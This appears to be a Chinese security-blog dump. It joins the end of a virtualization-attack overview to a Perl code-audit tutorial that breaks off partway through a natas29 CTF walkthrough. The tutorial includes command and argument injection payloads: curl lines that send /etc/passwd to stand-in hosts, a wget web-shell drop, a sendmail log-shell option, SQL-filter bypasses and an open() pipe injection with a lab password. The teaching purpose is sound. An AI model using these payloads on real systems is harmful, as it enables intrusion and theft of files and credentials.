资源释放型攻击（RFA）：将合法用户的虚拟机资源非法转移到攻击者的虚拟机，从而达到与窃取服务供给类似的攻击效果。攻击者通过耗尽目标虚拟机的某些关键资源，使目标虚拟机终止正在进行的服务并释放已占用的资源，攻击者利用新释放的资源来改善自身的性能。 恶意代码注入管理员通常会使用远程管理平台来远程管理虚拟机环境，平台是通过Hypervisor提供的接口对虚拟机进行管理的，这时就引入了Web层面的漏洞了，比如代码注入漏洞。 跨虚拟机侧信道攻击跨虚拟机侧信道攻击（Cross VM Side Channels Attacks）是指虚拟机之间利用共同访问的资源来实施恶意的攻击。这种攻击要求攻击者与目标虚拟机使用相同的物理机或者在地理位置上接近，使得攻击者可能获取到目标虚拟机的行为来得到一些可用于攻击的信息。 比如，攻击者可以通过恶意虚拟机访问共享硬件和缓存来进行攻击，如计时侧信道攻击、能量消耗侧信道攻击、高速隐蔽信道攻击等，最终导致目标虚拟机的敏感数据泄露。同时因为攻击者拥有使用物理机的权限，因此此类攻击难以触发告警留下痕迹。 侧信道攻击主要分为三种方式： 基于时间驱动（Time Driven）：攻击者重复检测受害者的加密操作所使用的时间，然后通过差分分析等技术推断出秘钥等信息； 基于轨迹驱动（Trace Driven）：攻击者通过持续地对设备的电能损耗、电磁发射等情况进行监控，获取到其敏感信息，但是这类侧信道攻击需要攻击者能够物理接近目标设备； 基于访问驱动（Access Driven）：攻击者在执行加密操作的系统中运行一个应用，这个应用用于监控共享Cache的使用情况，从而获取秘钥信息。这种攻击的优势在于不需要获取受害者精确的时间信息； 目前针对跨虚拟机侧信道攻击的典型防御策略有密钥划分机制和最小运行时间担保机制。 密钥划分机制：将用户密钥划分为随机份额，并以周期性更新的方式将各个密钥份额存储在不同的虚拟机上，可有效防范利用跨虚拟机侧信道攻击窃取加密密钥的攻击； 最小运行时间担保机制：通过优化虚拟机调度机制来降低缓存共享的安全风险，规定在最小运行时间限制内不能预先占用CPU资源； 定向共享内存攻击定向共享内存攻击是指攻击物理机或虚拟机的共享内存或缓存，从而造成用户数据泄露或云服务器信息泄露。 虚拟机回滚攻击虚拟机回滚攻击是指通过非法恢复虚拟机状态快照，使系统回滚到之前的状态而带来的攻击，从而导致用户数据泄露、云基础设施被破坏、隐藏攻击痕迹等风险。 一般的，VMM是提供备份、快照和还原等功能。这些机制会引来新的安全风险，比如回滚操作会违反一些基于线性时间的安全协议导致受到新的攻击、系统回滚后之前的漏洞和就账户又会重新出现。 基于虚拟机的Rootkit攻击基于虚拟机的Rootkit攻击（VMBR）是指攻击者利用Rootkit隐藏痕迹，通过保留root访问权限，在虚拟机系统中留下后门。VMBR攻击会在VMM启动之前将程序代码写入内存并运行，一旦攻击成功，那么所有的虚拟机系统都会沦陷。 检测和防御VMBR攻击的方法： 计时：通过检测一个指令的执行时间来判断该指令是否存在VMBR攻击； 通过可信模块保护VMM：通过启动过程的完整监测，可以防止Rootkit的隐蔽植入。TPM（Trusted Platform Module）不仅可以防御VMBR攻击，也可以防御其他破坏VMM完整性的攻击； DMA攻击DMA（Direct Memory Access）即直接内存访问。DMA传输是一种在虚拟机中不受VMM控制的数据传输。 DMA攻击是一种侧信道攻击，即攻击者可以通过利用高速扩展端口，穿透计算机和操作系统，直接读取DMA，DMA包含在许多连接中，DMA可以通过例如便携式摄像机、网卡、存储设备或者其他可直接读取或写入主内存的互动设备。此类设备的合法使用已导致DMA连接广泛，攻击者可以采用工具连接到DMA接口，绕过操作系统的安全机制和屏幕密码等，来访问部分或者全部的计算机物理内存地址，读取计算机的所有工作，窃取数据和加密密钥，安装运行间谍软件和其他漏洞利用程序，或者修改系统以允许后门或其他恶意软件。 虚拟机安全机制虚拟机中最常见的安全机制就是访问控制和虚拟机隔离，其他安全机制较零散、有空再补充。 访问控制访问控制通过限制主体对客体的访问权限和范围，保证客体不被非法访问。 虚拟机的访问控制策略一般有两种方案： 每个虚拟机各自部署访问控制策略，但可扩展性差、管理繁琐； 集中式存储访问控制策略，部署在Hypervisor上，可以实现统一配置和管理； 通过多租户的隔离实现访问控制通过多租户的隔离实现访问控制，主要是利用虚拟机下的隔离机制，增加访问控制策略并执行访问控制。 利用RBAC模型进行访问控制基于角色的访问控制（RBAC），将用户分类为不同的角色，给与不同角色不同的权限。 通过Hypervisor实现访问控制Hypervisor在虚拟机中具有较高的权限，可以利用Hypervisor来实现对虚拟机的访问控制，前提是信任Hypervisor的安全性。 虚拟机隔离在多租户以及多实例的虚拟化环境中，虚拟机之间的隔离程度是虚拟化平台的安全性指标之一。通过虚拟机隔离，才能保证虚拟机之间独立运行、互不干扰。 硬件隔离技术硬件隔离技术，利用硬件本身提供完整性监控保护，为虚拟化环境提供一个十分安全的隔离运行环境。一般由处理器或与主处理器连接的专用设备提供隔离功能。 通常有如下两种实现硬件隔离的方案： 在进行芯片设计时设计一个专门的硬件模块来处理安全事务，包括通常使用的智能卡以及手机的SIM卡； 在进行芯片设计时在芯片内集成一个专门的硬件模块； 系统级隔离技术系统级隔离技术是结合硬件的安全扩展和可信软件在系统中构建一个相对安全可靠可信执行环境（TEE），以将可信程序或敏感数据保护在该隔离环境中，同时也可以限制恶意代码的扩散。","tags":[{"name":"云存储","slug":"云存储","permalink":"https://www.mi1k7ea.com/tags/云存储/"},{"name":"云安全","slug":"云安全","permalink":"https://www.mi1k7ea.com/tags/云安全/"}]},{"title":"（信安之路首发）Perl基础&代码审计","date":"2020-11-24T14:12:46.000Z","path":"2020/11/24/Perl基础-代码审计/","text":"本篇博客首发于信安之路：《perl 代码审计从基础到实战》 0x01 Perl基础Perl基础部分参考自：https://www.runoob.com/perl/perl-tutorial.html 简介Perl全称Practical Extraction and Report Language，一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从大型机到便携设备，从快速原型创建到大规模可扩展开发，其最重要的特性是Perl内部集成了正则表达式的功能以及巨大的第三方代码库CPAN。 Perl语言的应用范围很广，除CGI以外，Perl被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl被称为脚本语言中的瑞士军刀。 Perl是一种弱类型语言。 运行方式 交互式：perl -e &lt;perl code&gt; 运行脚本（以.pl、.PL作为后缀）：perl script.pl 数据类型Perl是一种弱类型语言，所以变量不需要指定类型，Perl解释器会根据上下文自动选择匹配类型。 Perl有三个基本的数据类型： 标量：标量是 Perl 语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个$，表示是标量。例如：$a=123; 数组：数组变量以字符@开头，索引从0开始，如：@arr=(1,2,3) 哈希：哈希是一个无序的键值对集合。可以使用键作为下标获取值。哈希变量以字符%开头。如：%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); 基本语法Perl借用了C、sed、awk、shell脚本以及很多其他编程语言的特性，语法与这些语言有些类似，也有自己的特点。 Perl 程序有声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。 Perl 语言没有严格的格式规范，你可以根据自己喜欢的风格来缩进。 注释符Perl注释的方法为在语句的开头用字符#，如： 1# 这一行是 perl 中的注释 Perl也支持多行注释，最常用的方法是使用POD(Plain Old Documentations) 来进行多行注释。方法如下: 1234567891011#!/usr/bin/perl # 这是一个单行注释print \"Hello, world\\n\"; =pod 注释这是一个多行注释这是一个多行注释这是一个多行注释这是一个多行注释=cut 注意： =pod、 =cut只能在行首。 以=开头，以=cut结尾。 =后面要紧接一个字符，=cut后面可以不用。 空白符解析特点Perl解释器不会关心有多少个空白，所有类型的空白如空格、Tab、换行等如果在引号外解释器会忽略它，如果在引号内会原样输出。 1234#!/usr/bin/perlprint \"Hello world\\n\"; 输出： 12Hello world 单双引号解析区别Perl双引号和单引号的区别：双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出，但是用单引号定义可以使用多行文本。这点和PHP类似（双引号解析变量、而单引号不解析变量）。 12345#!/usr/bin/perl $a = \"mi1k7ea\";print \"a = $a\\n\";print 'a = $a\\n'; 输出： 12a = mi1k7eaa = $a\\n Tips： （1）双中有双，单中有单都需要\\转义。 （2）双中有单或单中有双均不需要转义。 （3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。 Here文档Here文档又称作heredoc、hereis、here-字串或here-脚本，是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。 123456789101112131415#!/usr/bin/perl $a = 10;$var = &lt;&lt;\"Mi1k7ea\";这是一个 Here 文档实例，使用双引号。可以在这输如字符串和变量。例如：a = $aMi1k7eaprint \"$var\\n\"; $var = &lt;&lt;'Mi1k7ea';这是一个 Here 文档实例，使用单引号。例如：a = $aMi1k7eaprint \"$var\\n\"; 输出： 123456这是一个 Here 文档实例，使用双引号。可以在这输如字符串和变量。例如：a = 10这是一个 Here 文档实例，使用单引号。例如：a = $a 注意： 必须后接分号，否则编译通不过； EOF可以用任意其它字符代替（例子用的Mi1k7ea），只需保证结束标识与开始标识一致； 结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）； 开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号； 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法； 子程序（函数）及传参Perl子程序即用户定义的函数。 123456789#!/usr/bin/perl # 函数定义sub Hello&#123; print \"Hello, World!\\n\";&#125; # 函数调用Hello(); 输出： 1Hello, World! Perl函数参数使用特殊数组@_标明，函数第一个参数为$_[0]、第二个参数为$_[1]，依次类推。 12345678#!/usr/bin/perlsub Test&#123; print '传入的参数：', \"@_\\n\"; return \"$_[0].$_[1]\";&#125;print \"返回结果：\", Test('mi1k7ea', 'com'), \"\\n\"; 输出： 12传入的参数：mi1k7ea com返回结果：mi1k7ea.com CGI环境搭建与CGI编程CGI环境搭建：下载Apache httpd服务器，直接运行然后访问http://localhost/cgi-bin/printEnv.pl即可： 正常没问题的话是如上图所示。注意一点，pl或cgi文件中第一行指定perl程序所在路径必须正确，否则会出现500 Error，我这里本地修改为#!D:\\Strawberry\\perl\\bin\\perl.exe。 第一个CGI程序，test.cgi： 12345678910111213#!D:/Strawberry/perl/bin/perl.exeprint \"Content-type:text/html\\r\\n\\r\\n\";print '&lt;html&gt;';print '&lt;head&gt;';print '&lt;meta charset=\"utf-8\"&gt;';print '&lt;title&gt;mi1k7ea.com&lt;/title&gt;';print '&lt;/head&gt;';print '&lt;body&gt;';print '&lt;h2&gt;Hello World!&lt;/h2&gt;';print '&lt;p&gt;Mi1k7ea的第一个CGI程序。&lt;/p&gt;';print '&lt;/body&gt;';print '&lt;/html&gt;'; 更多具体CGI参考：Perl CGI编程 0x02 Perl代码审计命令注入system()函数system()函数执行命令是有回显的。system后可以有圆括号，也可以没有。 参数全部可控12345$cmd = \"echo hacked\";system($cmd)# 或# $cmd = $ARGV[0];# system($cmd); 参数部分可控直接拼接命令的场景，可使用命令注入分隔符绕过： 12345$param = $ARGV[0];system(\"cat /tmp/$param\");# 或# $param = \";whoami\";# system(\"cat /tmp/$param\"); 将命令和参数分隔开就不行了，原因在于传递给system的参数变成了数组形式、严格按命令和参数进行区分了： 12345678$param = \";ls\";system(\"echo\", \"helloworld$param\");# 或# @cmd = (\"echo\",\"helloworld;ls\");# system @cmd;# 或# $param = $ARGV[0];# system(\"echo\", \"helloworld$param\"); 参数注入由前面数组形式执行system函数知道，命令注入是不成功的，但是某些写死的命令是可以进行参数注入的。但是这种注入方式较苛刻，需要有两处连续的可控点。 tar参数注入 tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。注入点需要–use-compress-program参数及其后面的参数值两处。 12@cmd = (\"tar\",\"--use-compress-program\",\"touch /tmp/perltest/mi1k7ea\",\"-cf\",\"/tmp/perltest/passwd\",\"/etc/passwd\");system @cmd; find参数注入 find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。注入点需要–execs参数及其后面的参数值两处。 12@cmd = (\"find\",\"/tmp\",\"-iname\",\"sth\",\"-or\",\"-exec\",\"id\",\";\",\"-quit\");system @cmd; wget参数注入 wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。注入点需要–directory-prefix参数及其后面的参数值两处和远程URL地址一处。 12@cmd = (\"wget\",\"--directory-prefix\",\"/var/www/html\",\"http://127.0.0.1:8080/shell.php\");system @cmd; sendmail参数注入 sendmail涉及到参数注入的几个参数： -O option = value：QueueDirectory = queuedir 选择队列消息 -X logfile：这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。 -C file：这个参数用File变量指定的备用配置文件启动sendmail命令。 常见的参数注入方式，这里只列出用法不举例了： 向Web目录写日志Shell：-O QueueDirectory=/tmp -X /var/www/html/log-shell.php 任意文件读取：-C/etc/passwd -X/tmp/output.txt curl参数注入 curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。 常见的参数注入方式，这里只列出用法不举例了： 以POST方式提交任意文件：-F filename=@/etc/passwd http://a.com/b.php 上传任意文件：-T /etc/passwd ftp://10.0.0.10 目录遍历在参数部分可控且不存在参数注入的场景下，如果注入的参数值为文件路径，那么就可以尝试进行目录遍历攻击。 比如： 12$param = $ARGV[0];system(\"cat /tmp/$param\"); exec()函数exec()函数和system()函数类似，执行命令是有回显的。exec后可以有圆括号，也可以没有。两者最大的区别是system()函数创建了一个fork进程，并等待查看命令是成功还是失败（返回一个值）；而exec()函数不返回任何内容，它只是执行命令。 参数全部可控12$cmd = \"echo exec_inject\";exec $cmd; 参数部分可控和前面system的情况一样，未进行数组分隔时能注入命令执行： 12$param = \";id\";exec(\"cat /tmp/$param\"); 同样，数组分隔传参就不行了： 12345$param = \";id\";exec(\"echo\", \"helloworld$param\");# 或# @a = (\"echo\",\"helloworld$ARGV[0]\");# exec @a; 此时可尝试如前面system()函数中讲到的参数注入或者目录遍历，这里不多说。 readpipe()函数readpipe()函数将EXPR作为命令执行，然后返回命令执行后的结果。也就是说，单单运行该函数是获取不到命令执行的回显结果的，需要结合print才能看到回显。 参数全部可控12345@result = readpipe(\"ls -l /tmp\");print \"@result\";# 执行命令无回显readpipe(\"touch /tmp/perltest/hacked\"); 参数部分可控readpipe()函数和前面两个命令执行函数不一样，即使是数组分隔命令和参数传参还是会执行命令！ 123@param = (\"cat\",\"/tmp/;id\");@result = readpipe @param;print \"@result\"; open()函数在Perl中open()函数被用来打开文件。该函数最为常见的使用形式如下： 1open (FILEHANDLE, \"filename\"); 在Perl的open()函数中，如果在文件名后加上管道符”|”，则Perl将会执行这个文件，而不是打开它。 参数全部可控open()函数的filename参数可以在其第一个字符前或最后一个字符后注入管道符来实现命令注入： 1234567open(STATFILE, \"|touch /tmp/perltest/hacked\");open(STATFILE, \"touch /tmp/perltest/hacked|\");# 有回显open(FILE, \"|id\");# 无回显open(FILE, \"id|\"); 参数部分可控因为filename一般就是某个文件路径，当filename参数前面已经指定好路径但实现参数拼接时，我们可以使用目录遍历的方法来实现注入： 12$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"/tmp/$param\"); 但如果是有重定向符写死的就不可以注入了，如果filename是含有&gt;标志的前缀，那么它是为输出而打开的，并且如果文件已经存在据就会覆盖原文件；如果含有&gt;&gt;前缀，那么是为追加打开的；前缀&lt;打开文件来进行输入操作，这也是不含前缀的时候的默认方式。比如： 123456$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"&lt;\", \"/tmp/$param\");# 或$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"&lt;/tmp/$param\"); 反引号Perl的反引号和PHP的反引号一样，可用于执行系统命令。具体利用场景需要具体分析。 12$param = \"whoami\";print `$param`; 代码注入evalPerl的eval函数的参数就是一段Perl代码，与PHP以及JS的eval类似，会执行自己语言的代码。 Perl的eval有两种使用方式，即eval EXPR和eval BLOCK。 eval EXPREXPR即表达式。在执行时， Perl解释器会首先解析表达式的值，然后将表达式值作为一条Perl语句插入当前执行上下文。所以，新生成的语句与eval语句本身具有相同的上下文环境。这种方式中，每次执行eval语句，表达式都会被解析。所以，如果eval EXPR如果出现在循环中，表达式可能会被解析多次。 eval的这种方式使得Perl脚本程序能实时生成和执行代码，从而实现了“动态代码”。 使用示例： 123456eval \"print 'mi1k7ea'\";eval 'print $a' . ', $b' ;eval 1 + 3 ;eval 'print ' . '$a + $b, \"\\n\"' ;eval $command;#$command = 'print \"mi1k7ea\"'eval $ARGV[0]; 如果eval中的EXPR即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下： 1eval $ARGV[0]; 此时直接注入system(&#39;touch /tmp/perltest/mi1k7ea&#39;)： eval BLOCKBLOCK即代码块。与第一种方式不同， BLOCK只会被解析一次，然后整个插入当前eval函数所在的执行上下文。由于解析上的性能的优势，以及可以在编译时进行代码语法检查，这种方式通常被作为Perl用来为一段代码提供异常捕捉机制，虽然前一种方式也可以。 使用示例： 12eval &#123;print $a&#125;;eval &#123;$a = 1, $b = 2, $c = $a + $b&#125;; 如果eval中的BLOCK即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下： 1eval &#123;system(\"touch /tmp/perltest/mi1k7ea\");&#125;; 另一种Block调用： 1234567push ( @program,'system(\"touch /tmp/perltest/mi1k7ea\");');foreach $exp (@program)&#123; $return = eval($exp); print $return,\"\\n\";&#125; SQL注入Perl中操作数据库默认就支持预编译，但是如果使用不当同样是存在SQL注入漏洞的。关键在于，没有正确使用占位符?。 在Perl中可以使用DBI（Database Independent Interface）模块来连接数据库。DBI作为Perl语言中和数据库进行通讯的标准接口，它定义了一系列的方法、变量和常量，提供一个和具体数据库平台无关的数据库持久层。 DBI相关函数如下： connect()函数：用于连接数据库； prepare()函数：用于预处理SQL语句； execute()函数：用于执行SQL语句； finish()函数：用于释放语句句柄； disconnect()函数：用于断开数据库连接； 正确使用预编译占位符的例子： 1234567891011121314151617181920212223242526272829303132use strict;use DBI;my $host = \"localhost\";my $driver = \"mysql\";my $database = \"test\";# 驱动程序对象的句柄my $dsn = \"DBI:$driver:database=$database:$host\";my $userid = \"root\";my $password = \"root\";my $username = $ARGV[0];# 连接数据库my $dbh = DBI-&gt;connect($dsn, $userid, $password ) or die $DBI::errstr;# 预编译SQL语句，注意占位符?的使用my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = ?\");# 执行SQL语句$sth-&gt;execute($username) or die $DBI::errstr;# 循环输出所有数据while ( my @row = $sth-&gt;fetchrow_array() )&#123; print join(':', @row).\"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); 此时预编译会将占位符的内容定死为参数值而不会将其中的某些字符串解释为SQL关键字，也就根源上解决了SQL注入问题： 但是，如果没有正确使用预编译占位符，如下代码，在prepare()函数中直接拼接变量，就会同样存在SQL注入问题： 12345# 预编译SQL语句，未使用占位符?而是采用变量拼接的方式my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = '$username'\");# 执行SQL语句$sth-&gt;execute() or die $DBI::errstr; 此时就能被SQL注入攻击： 结论：在prepare()函数进行预编译操作的时候，需要输入的参数值必须使用占位符，禁止直接使用变量拼接SQL语句。 XSSXSS是Web前端最常见的漏洞，Perl中也不缺席，关键还是在于Perl代码有没有进行HTML实体编码或者过滤特殊字符之后再输出到页面上。 比如下面CGI直接将参数原样不动返回到界面中： 12345678#!D:/Strawberry/perl/bin/perl.exeuse CGI;print \"Content-type: text/html\\n\\n\";$cgi = CGI-&gt;new();print $cgi-&gt;param('p'); 此时，就会产生XSS问题： 正确防御方法是进行HTML实体编码后再输出页面中： 1print CGI::escapeHTML($cgi-&gt;param('p')); 变量覆盖Perl语言的一些特性会导致存在一些变量覆盖问题，而变量覆盖往往会导致一些检测机制被绕过或者造成越权漏洞的产生。 哈希引入数组变量覆盖Perl的哈希中如果引入了数组，那么数组将会按键对值的结构扁平展开到哈希中，此时存在变量覆盖漏洞。 看个Demo，在hash中引入list，其中list包含hash中的一个键user并设置了对应的值admin： 1234567891011@list = (\"member\", \"user\", \"admin\");%hash = ( \"user\" =&gt; \"mi1k7ea\", \"password\" =&gt; \"666\", \"level\" =&gt; @list );while (($k, $v) = each %hash) &#123; print \"$k: $v\\n\";&#125; 输出，看到list中的键及值直接覆盖了原有的user键值对： 延伸到CGI场景中同理： 123456789101112#!D:/Strawberry/perl/bin/perl.exeuse CGI;print \"Content-type: text/html\\n\\n\";my $cgi = CGI-&gt;new();%user_info = (\"username\" =&gt; $cgi-&gt;param(\"username\"), \"password\" =&gt; \"123\");while (($k, $v) = each %user_info) &#123; print \"$k: $v\\n\";&#125; 正常请求/test.cgi?username=guest时，返回结果如下： 但是，当传入URL参数的key重复多次时/test.cgi?username=guest&amp;username=username&amp;username=admin，返回结果： 看到username参数被数组变量覆盖了。原理同上，即当URL传入多个同名参数时，$cgi-&gt;param()函数返回的是一个列表，输入参数username=test&amp;username=username&amp;username=admin时返回的是(&quot;test&quot;, &quot;username&quot;, &quot;admin&quot;)，此时数组就会和哈希结构进行合并，第一个元素guest则设置成username键的值，剩下的username和admin则单独组成为一对键值，新生成的键值对会覆盖掉原本的username的值为admin了。 案例——CVE-2014-1572（Bugzilla越权漏洞） 漏洞代码如下： 1234my $otheruser = Bugzilla::User-&gt;create(&#123; login_name =&gt; $login_name, realname =&gt; $cgi-&gt;param('realname'), cryptpassword =&gt; $password&#125;); 当提交下面请求内容时： 12a=confirm_new_account&amp;t=[TOKEN]&amp;passwd1=[password]&amp;passwd2=[password]&amp;realname=test&amp;realname=login_name&amp;realname=admin@bugzilla.org 此时传递给User-&gt;create()函数的结构如下： 12345&#123; realname =&gt; &apos;test&apos;, login_name =&gt; &apos;admin@bugzilla.org&apos;, cryptpassword =&gt; $password&#125; 这里漏洞根源正式往{}即哈希中传入数组，利用上述的特性导致变量覆盖从而导致越权漏洞的产生。 数组传参变量覆盖Perl的函数参数传递中如果传递的参数类型为数组，那么数组将会直接展开来赋值到对应位置的参数上，此时同样存在变量覆盖漏洞。 看个Demo，test()函数可传入三个参数，然后分别给其传入不同数量、某个参数类型为数组的参数： 1234567891011sub test &#123; ($a, $b, $c) = @_; print \"$a$b$c\\n\";&#125;test(1, 2);test(1, 2, 3);test((1, 2, 3));test(1, (2, 3));test(1, 2, 3, 4);test(1, (2, 3), 4); 输出： 可以看到，当传递给子程序的参数即便不够，传递的数组会被展开并赋值给a、b、c三个变量上；最后一个调用的第三个传入参数4并没有赋值给c变量。 这种数组传参覆盖的特性有啥安全问题？看个例子。 1234567891011121314151617181920212223242526272829303132333435#!D:/Strawberry/perl/bin/perl.exeuse CGI;use DBI;print \"Content-type: text/html\\n\\n\";sub sqli_filter&#123; my ( $str, $type ) = @_; defined $str or return \"NULL\"; defined $type &amp;&amp; ( $type == 6 ) and return $str; $str =~ s/\\\\/\\\\\\\\/sg; $str =~ s/\\'/\\\\\\'/sg; $str =~ s/\\\"/\\\\\\\"/sg; return $str;&#125;$cgi = CGI-&gt;new();my $user = sqli_filter($cgi-&gt;param('user'));print \"User Input After Filter: \".$user.\"&lt;br&gt;&lt;br&gt;\";my $dsn = \"DBI:mysql:database=test:localhost\";my $dbh = DBI-&gt;connect($dsn, \"root\", \"root\") or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = '$user'\");$sth-&gt;execute() or die $DBI::errstr;print \"SQL Query Result:&lt;br&gt;\";while ( my @row = $sth-&gt;fetchrow_array() )&#123; print join(':', @row).\"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); 这个CGI程序会从Web端接收一个user参数，然后通过自定义的sqli_filter()函数进行SQL注入特殊字符转义处理，最后查询数据库中对应的用户信息（假设为正确使用预编译进行SQL语句处理）。 正常访问，输入用户名即可查询用户信息： 尝试进行SQL注入获取所有用户信息，注入?user=testuser&#39; or 1--+，发现单引号被转义了： 结合数组参数变量覆盖，注入?user=testuser&#39; or 1--+&amp;user=6，可以看到成功进行了SQL注入，绕过了sqli_filter的检测过滤： 导致sqli_filter被绕过的漏洞根源在于，给该函数传递的是一个数组参数，通过变量覆盖的特性将type变量值给覆盖为了6，从而绕过了检测逻辑。 随机数安全Perl中的rand()函数只是从标准C库中调用相应的rand()函数，而C库函数rand()是一个不安全随机函数、其生成的数字不是加密安全的。 在C/C++安全编码规范中也明确禁止使用rand()产生用于安全用途的伪随机数。 强伪随机数CSPRNG（安全可靠的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator）的各种参考： Platform CSPRNG PHP mcrypt_create_iv, openssl_random_pseudo_bytes Java java.security.SecureRandom Dot NET (C#, VB) System.Security.Cryptography.RNGCryptoServiceProvider Ruby SecureRandom Python os.urandom Perl Math::Random::Secure C/C++ (Windows API) CryptGenRandom Any language on GNU/Linux or Unix Read from /dev/random or /dev/urandom 条件竞争条件竞争漏洞的根源在于两个逻辑相关的操作之间的执行存在时间差，而攻击者可以利用这个时间差来绕过某些逻辑实现攻击。 比如这段代码，先判断目标文件是否存在，如果不存在则创建并写入内容： 123unless (-e \"/tmp/a_temporary_file\") &#123; open (FH, \"&gt;/tmp/a_temporary_file\");&#125; 在这种情况下，这个时间差是指TOCTOU（检查时间-使用时间）。这里检测文件是否存在和打开写入文件两个操作之间存在一个时间差。如果攻击者利用这个时间差，在程序检测到文件不存在后就立即执行如下命令创建软链接到某个重要配置文件，如下： 1ln -s /tmp/a_temporary_file /etc/an_important_config_file 此时，程序过完这个时间差再来执行打开写入目标文件的操作时，由于目标文件已经被攻击者篡改为软链接因此会导致该重要配置文件被删除。 通常，最好的解决方法是在可能存在竞争条件的地方使用原子操作。这意味着仅使用一个系统调用即可检查文件并同时创建该文件，而不会给处理器提供机会在两者之间切换到另一个进程。 在刚刚的示例中，可以使用sysopen()函数并指定只写模式，而无需设置truncate标志来避免条件竞争的问题： 1234unless (-e \"/tmp/a_temporary_file\") &#123; #open (FH, \"&gt;/tmp/a_temporary_file\"); sysopen (FH, \"/tmp/a_temporary_file\", O_WRONLY); &#125; 这样，即使文件名被篡改了，但是当打开文件进行写入时也不会杀死它。 00截断类似PHP，Perl中也存在00截断的问题。 如下代码，假设file变量值”xxx”是外部可控的值，程序本意是想打开用户输入的值拼接上”.txt”后缀名的文件： 12$file = \"xxx\"; open(FILE, \"$file.txt\"); 此时，如果攻击者输入test%00，此时由于%00在URL解码变为0x00，其在Perl中代表了字符串的结束，因此open()函数打开的是”test”文件而不是”test.txt”文件。 当然，00截断的特性通常是结合其他漏洞进行组合绕过利用的，具体场景具体分析。 0x03 Perl漏洞实战看个Perl漏洞靶场： 123http://natas29.natas.labs.overthewire.orgusername:natas29password:airooCaiseiyee8he8xongien9euhe8b 访问目标站点，可以选择下拉框选项，这里点击”perl underground”后页面返回大量内容： 注意到参数名为file，推测后台是根据传入的参数名再传递给open()函数来打开处理。 尝试下open()函数的命令注入，输入|ls，注意管道符在前面是有回显的： 风平浪静，肯定是姿势不对。推测下原因，用open()函数打开的文件一般是要有后缀名的，而选项中的这几个file参数值都是不带后缀名的，那么就应该是后台对file参数值和后缀名进行一个拼接操作再open的。如果是这样，就能利用%00截断来截断掉后面拼接的后缀名使open()函数能够正确执行注入的命令。 输入|ls%00： 没毛病，通过%00截断的方式命令成功执行了，页面列出了当前目录下的所有文件。 我们看下index.pl的源码，输入|cat index.pl%00： 页面不太好看，直接看页面源码就得到index.pl的源码了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/perluse CGI qw(:standard);print &lt;&lt;END;Content-Type: text/html; charset=iso-8859-1&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = &#123; \"level\": \"natas29\", \"pass\": \"airooCaiseiyee8he8xongien9euhe8b\" &#125;;&lt;/script&gt;&lt;/head&gt;&lt;body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\"&gt;&lt;style&gt;#content &#123; width: 1000px;&#125;pre&#123; background-color: #000000; color: #00FF00; &#125; &lt;/style&gt;&lt;h1&gt;natas29&lt;/h1&gt;&lt;div id=\"content\"&gt;END## morla /10111# '$_=qw/ljttft3dvu&#123;/,s/./print chr ord($&amp;)-1/eg'## credits for the previous level go to whoever # created insomnihack2016/fridginator, where i stole the idea from. # that was a fun challenge, Thanks! #print &lt;&lt;END;H3y K1dZ,&lt;br&gt;y0 rEm3mB3rz p3Rl rit3?&lt;br&gt;\\\\/\\\\/4Nn4 g0 olD5kewL? R3aD Up!&lt;br&gt;&lt;br&gt;&lt;form action=\"index.pl\" method=\"GET\"&gt;&lt;select name=\"file\" onchange=\"this.form.submit()\"&gt; &lt;option value=\"\"&gt;s3lEcT suMp1n!&lt;/option&gt; &lt;option value=\"perl underground\"&gt;perl underground&lt;/option&gt; &lt;option value=\"perl underground 2\"&gt;perl underground 